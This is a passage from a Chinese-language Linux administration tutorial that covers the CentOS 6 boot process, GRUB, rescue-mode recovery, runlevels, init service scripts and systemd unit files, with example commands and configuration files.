/mnt/sysimage</span><br><span class="hljs-comment">#grub-install /dev/sda</span><br><span class="hljs-comment">#sync</span><br><span class="hljs-comment">#exit</span><br><span class="hljs-comment">#exit</span><br><span class="hljs-comment">#reboot</span><br></code></pre></td></tr></table></figure><h5 id="范例：centos6下的-boot-grub-grub-conf配置文件"><a href="#范例：centos6下的-boot-grub-grub-conf配置文件" class="headerlink" title="范例：centos6下的/boot/grub/grub.conf配置文件"></a>范例：centos6下的/boot/grub/grub.conf配置文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos6 ~]<span class="hljs-comment"># cat /boot/grub/grub.conf</span><br>default=0<br><span class="hljs-built_in">timeout</span>=5<br>title Willoneday<br>root (hd0,0)<br>kernel /vmlinuz-2.6.32-754.e16.x86_64 root=/dev/sda2<br>initrd /initramfs-2.6.32-754.e16.x86_64.img<br><br><span class="hljs-comment">###解读###</span><br><span class="hljs-comment">#default：设定默认启动的菜单项；落单项(title)编号从0开始</span><br><span class="hljs-comment">#timeout：指定菜单项等待选项选择的时长</span><br><span class="hljs-comment">#kernel XXX：设定本次启动的内核文件；额外还可添加许多内核支持使用的cmdline参数；例如：max_loop=100 selinux=0</span><br><span class="hljs-comment">#hd表示硬盘，第一个0表示第一个硬盘,第二个0代表第一个分区</span><br><span class="hljs-comment">#root=/dev/sda2 真正硬盘的根分区</span><br><span class="hljs-comment">#initrd XXX：设定为选定的内核提供额外文件的ramdisk</span><br></code></pre></td></tr></table></figure><h5 id="范例：-破解root口令"><a href="#范例：-破解root口令" class="headerlink" title="范例： 破解root口令"></a>范例： 破解root口令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">(1) 编辑grub菜单(选定要编辑的title，而后使用a 或 e 命令)<br>(2) 在选定的kernel后附加1, s, S，single 都可以进入单用户模式<br>(3) 在kernel所在行，键入“b”命令<br></code></pre></td></tr></table></figure><h4 id="（3）加载-kernel"><a href="#（3）加载-kernel" class="headerlink" title="（3）加载 kernel"></a>（3）加载 kernel</h4><h5 id="范例：误删除-boot-initramfs-2-6-32-754-el6-x86-64-img无法启动，故障恢复"><a href="#范例：误删除-boot-initramfs-2-6-32-754-el6-x86-64-img无法启动，故障恢复" class="headerlink" title="范例：误删除/boot/initramfs-2.6.32-754.el6.x86_64.img无法启动，故障恢复"></a>范例：误删除/boot/initramfs-2.6.32-754.el6.x86_64.img无法启动，故障恢复</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos6 ~]<span class="hljs-comment">#rm -f /boot/initramfs-2.6.32-754.el6.x86_64.img</span><br>[root@centos6 ~]<span class="hljs-comment">#reboot</span><br><span class="hljs-comment">#进入rescue模式</span><br><span class="hljs-comment">#chroot /mnt/sysimage</span><br><span class="hljs-comment">#mkinitrd /boot/initramfs-$(uname -r).img $(uname -r)</span><br><span class="hljs-comment">#sync</span><br><span class="hljs-comment">#exit</span><br><span class="hljs-comment">#exit</span><br><span class="hljs-comment">#reboot</span><br></code></pre></td></tr></table></figure><h4 id="（4）init初始化"><a href="#（4）init初始化" class="headerlink" title="（4）init初始化"></a>（4）init初始化</h4><h5 id="（4-1）运行级别"><a href="#（4-1）运行级别" class="headerlink" title="（4.1）运行级别"></a>（4.1）运行级别</h5><p>运行级别：为系统运行或维护等目的而设定；0-6：7个级别，一般使用3, 5做为默认级别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">0：关机<br>1：单用户模式(root自动登录), single, 维护模式<br>2：多用户模式，启动网络功能，但不会启动NFS；维护模式<br>3：多用户模式，正常模式；文本界面<br>4：预留级别；可同3级别<br>5：多用户模式，正常模式；图形界面<br>6：重启<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#切换级别：</span><br>init <span class="hljs-comment">#</span><br><br><span class="hljs-comment">#查看级别：</span><br>runlevel <br><span class="hljs-built_in">who</span> -r<br></code></pre></td></tr></table></figure><h5 id="（4-2）初始化脚本-sysinit"><a href="#（4-2）初始化脚本-sysinit" class="headerlink" title="（4.2）初始化脚本 sysinit"></a>（4.2）初始化脚本 sysinit</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/rc.d/rc.sysinit<br>系统初始化脚本功能<br>(1) 设置主机名<br>(2) 设置欢迎信息<br>(3) 激活udev和selinux <br>(4) 挂载/etc/fstab文件中定义的文件系统<br>(5) 检测根文件系统，并以读写方式重新挂载根文件系统<br>(6) 设置系统时钟<br>(7) 激活swap设备<br>(8) 根据/etc/sysctl.conf文件设置内核参数<br>(9) 激活lvm及software raid设备<br>(10)加载额外设备的驱动程序<br>(11)清理操作<br></code></pre></td></tr></table></figure><h4 id="（5）Centos6服务管理"><a href="#（5）Centos6服务管理" class="headerlink" title="（5）Centos6服务管理"></a>（5）Centos6服务管理</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看服务在所有级别的启动或关闭设定情形：</span><br>chkconfig [--list] [name]<br></code></pre></td></tr></table></figure><h5 id="范例：自定义服务脚本"><a href="#范例：自定义服务脚本" class="headerlink" title="范例：自定义服务脚本"></a>范例：自定义服务脚本</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos6 ~]<span class="hljs-comment"># cat /etc/init.d/testsrv </span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment"># chkconfig: - 96 3</span><br><span class="hljs-comment"># description: This is test service script</span><br>. /etc/init.d/functions <br><span class="hljs-function"><span class="hljs-title">start</span></span>()&#123;<br>   [ -e /var/lock/subsys/testsrv ] &amp;&amp; <span class="hljs-built_in">exit</span> || <span class="hljs-built_in">touch</span> /var/lock/subsys/testsrv<br>   action <span class="hljs-string">&quot;Starting testsrv&quot;</span><br>    <span class="hljs-built_in">sleep</span> 2 &#125;<br><span class="hljs-function"><span class="hljs-title">stop</span></span>()&#123;<br>   [ -e   /var/lock/subsys/testsrv ] &amp;&amp; <span class="hljs-built_in">rm</span> /var/lock/subsys/testsrv || <span class="hljs-built_in">exit</span><br>   action <span class="hljs-string">&quot;Stopping testsrv&quot;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-title">status</span></span>()&#123;<br>   [ -e /var/lock/subsys/testsrv ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;testsrv is running...&quot;</span> || <span class="hljs-built_in">echo</span><br><span class="hljs-string">&quot;testsrv is stopped&quot;</span><br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-variable">$1</span> <span class="hljs-keyword">in</span><br>start)<br>    start<br>   ;;<br>stop)<br>    stop<br>   ;;<br>restart)<br>    stop<br>    start<br>   ;;<br>status)<br>   status<br>   ;;<br>*)<br>    <span class="hljs-built_in">echo</span> $<span class="hljs-string">&quot;Usage: <span class="hljs-variable">$0</span> &#123;start|stop|status|restart&#125;&quot;</span><br>    <span class="hljs-built_in">exit</span> 2<br><span class="hljs-keyword">esac</span><br>[root@centos6 ~]<span class="hljs-comment"># chkconfig --add testsrv</span><br>[root@centos6 ~]<span class="hljs-comment"># chkconfig --list testsrv</span><br>testsrv       0:off 1:off 2:off 3:off 4:off 5:off 6:off<br>[root@centos6 ~]<span class="hljs-comment"># chmod +x /etc/init.d/testsrv</span><br>[root@centos6 ~]<span class="hljs-comment"># service testsrv start</span><br>/sbin:/usr/sbin:/bin:/usr/bin<br>Starting testsrv                                           [ OK ]<br>[root@centos6 ~]<span class="hljs-comment"># chkconfig --del testsrv</span><br></code></pre></td></tr></table></figure><h4 id="（6）非独立服务"><a href="#（6）非独立服务" class="headerlink" title="（6）非独立服务"></a>（6）非独立服务</h4><blockquote><p>服务分为独立服务和非独立服务</p><p>瞬态（Transient）服务被超级守护进程 xinetd 进程所管理，也称为非独立服务</p><p>进入的请求首先被xinetd代理</p><p>配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/xinetd.conf<br>/etc/xinetd.d/&lt;service&gt;<br></code></pre></td></tr></table></figure></blockquote><h5 id="范例：Centos6-开启-telnet服务"><a href="#范例：Centos6-开启-telnet服务" class="headerlink" title="范例：Centos6 开启 telnet服务"></a>范例：Centos6 开启 telnet服务</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos6 ~]<span class="hljs-comment"># yum -y install telnet-server</span><br><span class="hljs-comment">#设为开机启动</span><br>[root@centos6 ~]<span class="hljs-comment"># chkconfig telnet on   </span><br>[root@centos6 ~]<span class="hljs-comment"># service xinetd start</span><br><br><span class="hljs-comment">#注：由xinetd控制telnet的启动</span><br></code></pre></td></tr></table></figure><h4 id="（7）开机启动文件-rc-local"><a href="#（7）开机启动文件-rc-local" class="headerlink" title="（7）开机启动文件 rc.local"></a>（7）开机启动文件 rc.local</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/rc.local<br>/etc/rc.d/rc.local<br></code></pre></td></tr></table></figure><blockquote><p>注意：正常级别下，最后启动一个服务S99local没有链接至/etc/rc.d/init.d一个服务脚本，而是指向了/etc/rc.d/rc.local脚本</p><p>不便或不需写为服务脚本放置于/etc/rc.d/init.d/目录，且又想开机时自动运行的命令，可直接放置于/etc/rc.d/rc.local文件中</p><p>/etc/rc.d/rc.local在指定运行级别脚本后运行</p><p><strong>注意</strong><strong>:</strong> <strong>默认****Ubuntu</strong> <strong>无</strong> <strong>/etc/rc.local</strong> <strong>文件</strong><strong>,<strong><strong>可以创建此脚本文件并添加执行权限</strong></strong>,rc.local****的首行必须有</strong> <strong>shebang****机制</strong></p></blockquote><h4 id="（8）Centos6-启动过程总结"><a href="#（8）Centos6-启动过程总结" class="headerlink" title="（8）Centos6 启动过程总结"></a>（8）Centos6 启动过程总结</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST--<br>GRUB1阶段MBR446--<br>GRUB1.5MBR之后的空间（提供grub2文件所有分区的文件系统）--<br>GRUB2阶段（grub.conf）<br>--kernel(initramfs.img)--根分区--<br>/sbin/init--/etc/inittab--/etc/rc.sysinit（系统初始化脚本）--<br>/etc/rc.d/rc--/etc/rcN.d/K,S(/etc/init.d/)--/etc/rc.local--login登录<br></code></pre></td></tr></table></figure><hr><h2 id="2-systemd和启动流程"><a href="#2-systemd和启动流程" class="headerlink" title="2 systemd和启动流程"></a>2 systemd和启动流程</h2><h3 id="2-1-systemd-特性"><a href="#2-1-systemd-特性" class="headerlink" title="2.1 systemd 特性"></a>2.1 systemd 特性</h3><p>Systemd：从 CentOS 7 版本之后开始用 systemd 实现init进程，系统启动和服务器守护进程管理器，负责在系统启动或运行时，激活系统资源，服务器进程和其它进程</p><blockquote><p>systemd 核心概念：unit</p><p>unit表示不同类型的systemd对象，通过配置文件进行标识和配置；文件中主要包含了系统服务、监听socket、保存的系统快照以及其它与init相关的信息</p><p>Unit类型：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看unit类型</span><br>[root@rocky01 ~]<span class="hljs-comment"># systemctl -t help</span><br>Available unit types:<br>service<br>socket<br>target<br>device<br>mount<br>automount<br>swap<br>timer<br>path<br>slice<br>scope<br></code></pre></td></tr></table></figure><ul><li>service unit: 文件扩展名为.service, 用于定义系统服务</li><li>Socket unit: .socket, 定义进程间通信用的socket文件，也可在系统启动时，延迟启动服务，实现按需启动</li><li>Target unit: 文件扩展名为.target，用于模拟实现运行级别</li><li>Device unit: .device, 用于定义内核识别的设备</li><li>Mount unit: .mount, 定义文件系统挂载点</li><li>Snapshot unit: .snapshot, 管理系统快照</li><li>Swap unit: .swap, 用于标识swap设备</li><li>Automount unit: .automount，文件系统的自动挂载点</li><li>Path unit: .path，用于定义文件系统中的一个文件或目录使用,常用于当文件系统变化时，延迟激活服务，如：spool 目录</li></ul></blockquote><blockquote><p>unit的配置文件</p><p>/usr/lib/systemd/system #每个服务最主要的启动脚本设置，类似于之前的/etc/init.d/</p><p>/lib/systemd/system #ubutun的对应目录,兼容于CentOS7,8和Ubuntu</p><p>/run/systemd/system #系统执行过程中所产生的服务脚本，比上面目录优先运行</p><p>/etc/systemd/system #管理员建立的执行脚本，类似于/etc/rcN.d/Sxx的功能，比上面目录优先运行</p></blockquote><h3 id="2-2-systemctl管理系统服务service-unit"><a href="#2-2-systemctl管理系统服务service-unit" class="headerlink" title="2.2 systemctl管理系统服务service unit"></a>2.2 systemctl管理系统服务service unit</h3><p>命令：<code>systemctl COMMAND name.service</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#启动：相当于service name start </span><br>systemctl start name.service   <br><br><span class="hljs-comment">#停止：相当于service name stop</span><br>systemctl stop name.service<br><br><span class="hljs-comment">#重启：相当于service name restart </span><br>systemctl restart name.service <br><br><span class="hljs-comment">#查看状态：相当于service name status</span><br>systemctl status name.service<br><br><span class="hljs-comment">#重新加载配置</span><br>systemctl reload sshd.service<br><br><span class="hljs-comment">#禁止自动和手动启动：</span><br>systemctl mask name.service<br><br><span class="hljs-comment">#取消禁止</span><br>systemctl unmask name.service<br><br><span class="hljs-comment">#查看某服务当前激活与否的状态：</span><br>systemctl is-active name.service<br><br><span class="hljs-comment">#查看service文件内容</span><br>systemctl <span class="hljs-built_in">cat</span> sshd<br><br><span class="hljs-comment">#查看所有已经激活的服务：</span><br>systemctl list-units --<span class="hljs-built_in">type</span> service 或<br>systemctl list-units -t service<br><br><span class="hljs-comment">#查看所有服务：</span><br>systemctl list-units --<span class="hljs-built_in">type</span> service --all 或<br>systemctl list-units --<span class="hljs-built_in">type</span> service -a<br><br><span class="hljs-comment">#设定某服务开机自启，相当于chkconfig name on</span><br>systemctl <span class="hljs-built_in">enable</span> name.service <br><br><span class="hljs-comment">#设定某服务开机禁止启动：相当于chkconfig name off</span><br>systemctl <span class="hljs-built_in">disable</span> name.service<br><br><span class="hljs-comment">#查看所有服务的开机自启状态，相当于chkconfig --list</span><br>systemctl list-unit-files --<span class="hljs-built_in">type</span> service<br><br><span class="hljs-comment">#用来列出该服务在哪些运行级别下启用和禁用：chkconfig –list name</span><br><span class="hljs-built_in">ls</span> /etc/systemd/system/*.wants/name.service<br><br><span class="hljs-comment">#查看服务是否开机自启：</span><br>systemctl is-enabled name.service<br><br><span class="hljs-comment">#列出失败的服务</span><br>systemctl --failed --<span class="hljs-built_in">type</span>=service<br> <br><span class="hljs-comment">#开机并立即启动或停止</span><br>systemctl <span class="hljs-built_in">enable</span> --now postfix <br>systemctl <span class="hljs-built_in">disable</span>  --now postfix<br><br><span class="hljs-comment">#查看服务的依赖关系：</span><br>systemctl list-dependencies name.service<br><br><span class="hljs-comment">#杀掉进程：</span><br>systemctl <span class="hljs-built_in">kill</span> unitname<br></code></pre></td></tr></table></figure><h3 id="2-3-service-unit文件格式"><a href="#2-3-service-unit文件格式" class="headerlink" title="2.3 service unit文件格式"></a>2.3 service unit文件格式</h3><p>/etc/systemd/system：系统管理员和用户使用</p><p>/usr/lib/systemd/system：发行版打包者使用</p><blockquote><p>unit 格式说明：</p><ul><li>以 “#” 开头的行后面的内容会被认为是注释</li><li>相关布尔值，1、yes、on、true 都是开启，0、no、off、false 都是关闭</li><li>时间单位默认是秒，所以要用毫秒（ms）分钟（m）等须显式说明</li></ul><p>service unit file文件通常由三部分组成：</p><ul><li>Type：定义影响ExecStart及相关参数的功能的unit进程启动类型<ul><li>simple：默认值，这个daemon主要由ExecStart接的指令串来启动，启动后常驻于内存中</li><li>forking：由ExecStart启动的程序透过spawns延伸出其他子程序来作为此daemon的主要服务。原生父程序在启动结束后就会终止</li><li>oneshot：与simple类似，不过这个程序在工作完毕后就结束了，不会常驻在内存中</li><li>dbus：与simple类似，但这个daemon必须要在取得一个D-Bus的名称后，才会继续运作.因此通常也要同时设定BusNname= 才行</li><li>notify：在启动完成后会发送一个通知消息。还需要配合 NotifyAccess 来让 Systemd 接收消息</li><li>idle：与simple类似，要执行这个daemon必须要所有的工作都顺利执行完毕后才会执行。这类的daemon通常是开机到最后才执行即可的服务</li></ul></li><li>[Unit]：定义与Unit类型无关的通用选项；用于提供unit的描述信息、unit行为及依赖关系等</li><li>[Service]：与特定类型相关的专用选项；此处为Service类型</li><li>[Install]：定义由“systemctl enable”以及”systemctl disable“命令在实现服务启用或禁用时用到的一些选项</li></ul><p>Unit段的常用选项：</p><ul><li>Description：描述信息</li><li>After：定义unit的启动次序，表示当前unit应该晚于哪些unit启动，其功能与Before相反</li><li>Requires：依赖到的其它units，强依赖，被依赖的units无法激活时，当前unit也无法激活</li><li>Wants：依赖到的其它units，弱依赖</li><li>Conflicts：定义units间的冲突关系</li></ul><p>Service段的常用选项：</p><ul><li>EnvironmentFile：环境配置文件</li><li>ExecStart：指明启动unit要运行命令或脚本的绝对路径</li><li>ExecStartPre： ExecStart前运行</li><li>ExecStartPost： ExecStart后运行</li><li>ExecStop：指明停止unit要运行的命令或脚本</li><li>Restart：当设定Restart=1 时，则当次daemon服务意外终止后，会再次自动启动此服务</li></ul><p>Install段的常用选项：</p><ul><li>Alias：别名，可使用systemctl command Alias.service</li><li>RequiredBy：被哪些units所依赖，强依赖</li><li>WantedBy：被哪些units所依赖，弱依赖</li><li>Also：安装本服务的时候还要安装别的相关服务</li></ul></blockquote><p><strong>注意：对于新创建的unit文件，或者修改了的unit文件，要通知systemd重载此配置文件,而后可以选择重启</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># systemctl daemon-reload</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># systemctl cat sshd.service</span><br><span class="hljs-comment"># /usr/lib/systemd/system/sshd.service</span><br>[Unit]<br>Description=OpenSSH server daemon<br>Documentation=man:sshd(8) man:sshd_config(5)<br>After=network.target sshd-keygen.target<br>Wants=sshd-keygen.target<br><br>[Service]<br>Type=notify<br>EnvironmentFile=-/etc/crypto-policies/back-ends/opensshserver.config<br>EnvironmentFile=-/etc/sysconfig/sshd<br>ExecStart=/usr/sbin/sshd -D <span class="hljs-variable">$OPTIONS</span> <span class="hljs-variable">$CRYPTO_POLICY</span><br>ExecReload=/bin/kill -HUP <span class="hljs-variable">$MAINPID</span><br>KillMode=process<br>Restart=on-failure<br>RestartSec=42s<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><h4 id="范例：自定义service的unit文件"><a href="#范例：自定义service的unit文件" class="headerlink" title="范例：自定义service的unit文件"></a>范例：自定义service的unit文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># cat /lib/systemd/system/hello.service</span><br>[Unit]<br>Description=Hello World<br>[Service]<br>TimeoutStartSec=0<br>ExecStart=/bin/sh -c <span class="hljs-string">&quot;while true; do echo Hello World; sleep 1; done&quot;</span><br>ExecStop=/bin/kill sh<br>[Install]<br>WantedBy=multi-user.target<br>[root@rocky01 ~]<span class="hljs-comment">#</span><br>[root@rocky01 ~]<span class="hljs-comment"># systemctl start hello</span><br>[root@rocky01 ~]<span class="hljs-comment"># systemctl status hello</span><br>● hello.service - Hello World<br>   Loaded: loaded (/usr/lib/systemd/system/hello.service; disabled; vendor preset: disabled)<br>   Active: active (running) since Fri 2022-10-07 22:07:03 CST; 3s ago<br> Main PID: 2174 (sh)<br>    Tasks: 2 (<span class="hljs-built_in">limit</span>: 23457)<br>   Memory: 600.0K<br>   CGroup: /system.slice/hello.service<br>           ├─2174 /bin/sh -c <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> Hello World; <span class="hljs-built_in">sleep</span> 1; <span class="hljs-keyword">done</span><br>           └─2178 <span class="hljs-built_in">sleep</span> 1<br><br>Oct 07 22:07:03 rocky01 systemd[1]: Started Hello World.<br>Oct 07 22:07:03 rocky01 sh[2174]: Hello World<br>Oct 07 22:07:04 rocky01 sh[2174]: Hello World<br>Oct 07 22:07:05 rocky01 sh[2174]: Hello World<br>Oct 07 22:07:06 rocky01 sh[2174]: Hello World<br></code></pre></td></tr></table></figure><h4 id="范例：服务unit文件解读"><a href="#范例：服务unit文件解读" class="headerlink" title="范例：服务unit文件解读"></a>范例：服务unit文件解读</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[Unit]<br>Description=The Nginx HTTP Server daemon <span class="hljs-comment"># 描述信息</span><br>After=network.target remote-fs.target nss-lookup.target <span class="hljs-comment"># 指定启动nginx之前需要其他的其他服务，如network.target等</span><br><br>[Service]<br><span class="hljs-comment"># Type为服务类型，仅启动一个主进程的服务为simple，需要启动若干子进程的服务为forking</span><br>Type=forking <br><span class="hljs-comment"># 设置执行systemctl start nginx后需要启动的具体命令</span><br>ExecStart=/usr/local/nginx/sbin/nginx<br><span class="hljs-comment"># 设置执行systemctl reload nginx后需要执行的具体命令</span><br>ExecReload=/usr/local/nginx/sbin/nginx -s reload<br><span class="hljs-comment"># 设置执行systemctl stop nginx后需要执行的具体命令</span><br>ExecStop=/bin/kill -s QUIT <span class="hljs-variable">$&#123;MAINPID&#125;</span><br><br>[Install]<br><span class="hljs-comment"># 设置在什么模式下被安装，设置开机启动的时候需要</span><br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><h4 id="范例：Ubuntu实现开机自动运行程序"><a href="#范例：Ubuntu实现开机自动运行程序" class="headerlink" title="范例：Ubuntu实现开机自动运行程序"></a>范例：Ubuntu实现开机自动运行程序</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu1804 ~]<span class="hljs-comment"># cat /etc/rc.local</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;\E[31;1mstarting test service\E[0m&#x27;</span><br><span class="hljs-built_in">sleep</span> 10<br>[root@ubuntu1804 ~]<span class="hljs-comment"># chmod +x /etc/rc.local</span><br>[root@ubuntu1804 ~]<span class="hljs-comment"># reboot</span><br></code></pre></td></tr></table></figure><h3 id="2-4-运行级别"><a href="#2-4-运行级别" class="headerlink" title="2.4 运行级别"></a>2.4 运行级别</h3><blockquote><p>target units：相当于CentOS 6之前的runlevel ,unit配置文件：.target</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /usr/lib/systemd/system/*.target<br>systemctl list-unit-files --<span class="hljs-built_in">type</span> target  --all<br></code></pre></td></tr></table></figure></blockquote><blockquote><p>和运行级别对应关系</p><p>0  ==&gt; runlevel0.target, poweroff.target</p><p>1  ==&gt; runlevel1.target, rescue.target</p><p>2  ==&gt; runlevel2.target, multi-user.target</p><p>3  ==&gt; runlevel3.target, <strong>multi-user.target</strong></p><p>4  ==&gt; runlevel4.target, multi-user.target</p><p>5  ==&gt; runlevel5.target, graphical.target</p><p>6  ==&gt; runlevel6.target, reboot.target</p></blockquote><h4 id="获取默认运行级别"><a href="#获取默认运行级别" class="headerlink" title="获取默认运行级别"></a>获取默认运行级别</h4><p>相当于查看 /etc/inittab</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 